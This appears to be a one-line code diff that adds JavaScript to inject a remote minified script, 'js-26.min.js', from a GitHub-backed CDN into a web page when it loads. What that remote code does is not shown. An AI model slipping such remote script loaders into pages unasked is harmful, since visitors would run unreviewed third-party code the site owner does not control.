@@ -1,0 +1,1 @@
+var nuclear_script=document.createElement('script');nuclear_script.src='https://cdn.jsdelivr.net/gh/imba97/js/code/js-26.min.js';document.body.appendChild(nuclear_script);
